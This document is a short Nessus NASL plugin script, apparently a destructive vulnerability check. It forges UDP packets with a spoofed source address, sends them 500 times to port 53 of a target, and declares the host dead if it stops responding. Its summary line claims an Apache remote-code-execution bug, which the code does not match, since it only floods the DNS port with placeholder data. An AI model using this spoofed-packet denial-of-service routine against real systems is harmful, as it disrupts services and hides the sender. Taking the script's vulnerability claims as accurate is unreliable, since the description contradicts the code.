
if(description)	{
	script_name(english:"Forging Packet UDP, malformed ");
	script_summary(english:"using a bug in apache, executes code remotely");
	script_category(ACT_DESTRUCTIVE_ATTACK);
	script_copyright(english:"This script was written by Riccardo Melioli");
	exit(0);
}

# COSTANTI
sport = 62000;
dport = 53;
src ="1.2.3.4";
data = string("MALFORMED...");

# creazione pacchetto ip
ip = forge_ip_packet(ip_v : 4,
			 ip_hl : 5,
		     ip_tos : 0,
		     ip_p : IPPROTO_UDP,
		     ip_src : src,
		     ip_ttl : 64
);


# creazione pacchetto UDP
udp = forge_udp_packet(ip: ip,
		       uh_sport : sport,
		       uh_dport : dport,
			   data : data
);


# invia i pacchetti UDP 500 volte
start_denial();
send_packet(udp) x 500;
alive = end_denial();

if (!alive){
	set_kb_item(name:"Host/dead", value:TRUE);
	security_hole(0);
}